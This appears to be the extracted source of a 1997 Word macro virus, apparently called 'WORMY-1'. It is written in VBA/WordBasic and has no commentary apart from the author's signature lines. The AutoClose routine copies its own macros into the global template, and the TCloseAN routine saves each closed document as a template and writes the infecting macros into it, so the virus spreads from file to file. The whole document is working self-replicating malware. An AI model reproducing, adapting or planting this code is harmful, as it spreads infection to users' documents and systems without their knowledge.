   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim sMe$
   Dim sMacro$
   Dim ExecuteOnly
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "DCloseAN" Then
               bInstalled = -1
           End If
       Next i
       If Not bInstalled Then
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":TCloseAN"
           WordBasic.MacroCopy sMacro$, "AutoClose", ExecuteOnly
           sMacro$ = sMe$ + ":AutoClose"
           WordBasic.MacroCopy sMacro$, "DCloseAN", ExecuteOnly
           WordBasic.MsgBox "WORMY-1 by NAENBGOURSG", -2
                   'by NAENBGOURSG
                   'SO.HT.AI.KS
                   '231076-GREECE
                   'Thanks to NEURO
                   'VRD 19-4-1997
                   'VRP A.U.A (Ã.Ð.Á)
           End If
   Abort:
   End Sub

   Attribute VB_Name = "TCloseAN"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.FileSaveAs Format:=1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "DCloseAN", sTMacro$
   sTMacro$ = sMe$ + ":TCloseAN"
   WordBasic.MacroCopy "AutoClose", sTMacro$
   WordBasic.FileSave
   Bail:
   End Sub
